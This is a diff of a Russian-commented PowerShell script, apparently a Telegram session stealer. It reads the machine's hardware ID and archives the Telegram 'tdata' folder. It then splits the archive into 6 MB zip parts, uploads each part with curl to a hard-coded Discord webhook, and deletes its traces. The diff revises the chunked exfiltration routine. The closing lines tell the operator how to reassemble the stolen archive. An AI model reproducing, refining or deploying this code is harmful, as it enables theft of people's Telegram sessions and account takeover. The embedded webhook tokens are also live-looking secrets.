@@ -1,7 +1,7 @@
-# ===== СКРИПТ ALPHA ДЛЯ ZETA v6.0 - ФИНАЛЬНАЯ ВЕРСИЯ =====
-# Вся логика в одном месте, без ебаных багов
+# ===== СКРИПТ ALPHA ДЛЯ ZETA v7.0 - ЧАСТИ В ZIP =====
+# Каждая часть - отдельный ZIP-архив, мать твою!
 
-$webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"
+$webhook = "https://discord.com/api/webhooks/1524393669531140256/D7ZilwH7PeFWPrpPB3Z9Iw7pAgBTwvTBZqLH2oQP3L6ycjkLp9mo_MJmLIJ4DV9UiU6y"
 
 # HWID
 try { $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID } catch { $hwid = "UNKNOWN_HWID" }
@@ -37,51 +37,85 @@ function New-ZipArchive {
 }
 
 # ============================================================
-# ФУНКЦИЯ ОТПРАВКИ - АВТОМАТИЧЕСКИ РЕЖЕТ НА ЧАСТИ
+# ФУНКЦИЯ РАЗБИВКИ НА ZIP-ЧАСТИ
 # ============================================================
-function Send-LargeFile {
-    param($FilePath)
+function Split-ZipIntoParts {
+    param(
+        [string]$ZipPath,
+        [int]$PartSizeMB = 6
+    )
     
-    if (-not (Test-Path $FilePath)) { return }
+    if (-not (Test-Path $ZipPath)) { return @() }
     
-    $fileSize = (Get-Item $FilePath).Length
-    $sizeMB = $fileSize / 1MB
-    
-    Write-Host "[*] Обработка файла: $([System.IO.Path]::GetFileName($FilePath)) ($([math]::Round($sizeMB,2)) MB)" -ForegroundColor Yellow
-    
-    # Если файл меньше 7MB - отправляем целиком
-    if ($fileSize -le 7MB) {
-        curl.exe -s -F "file=@$FilePath" $webhook
-        Write-Host "[✓] Отправлен: $([System.IO.Path]::GetFileName($FilePath))" -ForegroundColor Green
-        return
-    }
-    
-    # Разбиваем на части по 6MB (с запасом)
-    Write-Host "[*] Файл больше 7MB, разбиваю на части..." -ForegroundColor Yellow
-    
-    $partSize = 6MB
+    $fileSize = (Get-Item $ZipPath).Length
+    $partSize = $PartSizeMB * 1MB
     $totalParts = [math]::Ceiling($fileSize / $partSize)
-    $stream = [System.IO.File]::OpenRead($FilePath)
+    
+    Write-Host "[*] Разбиваю архив на $totalParts частей по $PartSizeMB MB..." -ForegroundColor Yellow
+    
+    $partFiles = @()
+    $stream = [System.IO.File]::OpenRead($ZipPath)
     $buffer = New-Object byte[] $partSize
+    $baseName = [System.IO.Path]::GetFileNameWithoutExtension($ZipPath)
+    $dir = Split-Path $ZipPath -Parent
     
     for ($i = 1; $i -le $totalParts; $i++) {
         $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
         if ($bytesRead -eq 0) { break }
         
-        $partFile = "$env:TEMP\part_$hwid`_$i.bin"
-        [System.IO.File]::WriteAllBytes($partFile, $buffer[0..($bytesRead-1)])
+        # Создаём временную папку для части
+        $tempDir = "$env:TEMP\part_$i"
+        if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
+        New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
         
-        $partSizeMB = (Get-Item $partFile).Length / 1MB
-        Write-Host "[*] Отправляю часть $i/$totalParts ($([math]::Round($partSizeMB,2)) MB)..." -ForegroundColor Cyan
+        # Сохраняем часть как бинарник во временную папку
+        $partBin = Join-Path $tempDir "part.bin"
+        [System.IO.File]::WriteAllBytes($partBin, $buffer[0..($bytesRead-1)])
         
-        curl.exe -s -F "file=@$partFile" -F "filename=part_$i" $webhook
+        # Создаём ZIP из этой части
+        $partZip = "$dir\${baseName}.part$i.zip"
+        if (New-ZipArchive -SourceFolder $tempDir -ZipPath $partZip) {
+            $partFiles += $partZip
+            $partSizeMB = (Get-Item $partZip).Length / 1MB
+            Write-Host "[✓] Часть $i/$totalParts: $([math]::Round($partSizeMB,2)) MB" -ForegroundColor Green
+        } else {
+            Write-Host "[!] Не удалось создать ZIP для части $i" -ForegroundColor Red
+            # Если не получилось - отправляем bin
+            $partFiles += $partBin
+        }
         
-        Remove-Item $partFile -Force -ErrorAction SilentlyContinue
-        Start-Sleep -Milliseconds 500
+        # Чистим
+        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
     }
     
     $stream.Close()
-    Write-Host "[✓] Файл разбит на $totalParts частей и отправлен" -ForegroundColor Green
+    return $partFiles
+}
+
+# ============================================================
+# ФУНКЦИЯ ОТПРАВКИ
+# ============================================================
+function Send-File {
+    param($FilePath)
+    if (-not (Test-Path $FilePath)) { return }
+    
+    $size = (Get-Item $FilePath).Length / 1MB
+    
+    if ($size -gt 7) {
+        Write-Host "[!] Файл $([math]::Round($size,2)) MB > 7MB, разбиваю..." -ForegroundColor Yellow
+        $parts = Split-ZipIntoParts -ZipPath $FilePath -PartSizeMB 6
+        foreach ($part in $parts) {
+            $partSize = (Get-Item $part).Length / 1MB
+            curl.exe -s -F "file=@$part" $webhook
+            Write-Host "[✓] Отправлена часть: $([System.IO.Path]::GetFileName($part)) ($([math]::Round($partSize,2)) MB)" -ForegroundColor Green
+            Remove-Item $part -Force -ErrorAction SilentlyContinue
+            Start-Sleep -Milliseconds 500
+        }
+        return
+    }
+    
+    curl.exe -s -F "file=@$FilePath" $webhook
+    Write-Host "[✓] Отправлен: $([System.IO.Path]::GetFileName($FilePath)) ($([math]::Round($size,2)) MB)" -ForegroundColor Green
 }
 
 # ============================================================
@@ -174,21 +208,15 @@ if (Test-Path $tgPath) {
         $zipSize = (Get-Item $zipPath).Length / 1MB
         Write-Host "[✓] Архив создан, размер: $([math]::Round($zipSize,2)) MB" -ForegroundColor Green
         
-        # ОТПРАВЛЯЕМ АРХИВ С РАЗБИВКОЙ
-        Send-LargeFile -FilePath $zipPath
+        # ОТПРАВЛЯЕМ (автоматически разобьёт если надо)
+        Send-File -FilePath $zipPath
         
         Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
     } else {
-        Write-Host "[!] Не удалось создать архив, отправляю файлами по отдельности..." -ForegroundColor Red
+        Write-Host "[!] Не удалось создать архив, отправляю файлами..." -ForegroundColor Red
         $allFiles = Get-ChildItem -Path $tgRoot -Recurse -File
         foreach ($f in $allFiles) {
-            if ($f.Length -gt 7MB) {
-                # Большие файлы разбиваем
-                Send-LargeFile -FilePath $f.FullName
-            } else {
-                curl.exe -s -F "file=@$($f.FullName)" $webhook
-                Write-Host "[✓] Отправлен: $($f.Name)" -ForegroundColor Green
-            }
+            Send-File -FilePath $f.FullName
             Start-Sleep -Milliseconds 300
         }
     }
@@ -201,5 +229,6 @@ if (Test-Path $tgPath) {
 # ФИНАЛ
 # ============================================================
 Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
-Write-Host "[✓] Всё сделано, Alpha! Архив разбит на части и отправлен." -ForegroundColor Magenta
-Write-Host "[*] Чтобы собрать архив обратно, выполни: copy /b part_*.bin tdata.zip" -ForegroundColor Cyan
+Write-Host "[✓] Всё сделано, Alpha!" -ForegroundColor Magenta
+Write-Host "[*] Ты получишь: tdata_HWID.zip или tdata_HWID.part1.zip, part2.zip и т.д." -ForegroundColor Cyan
+Write-Host "[*] Если частей несколько - распакуй все в одну папку и склей: copy /b *.part* tdata.zip" -ForegroundColor Cyan
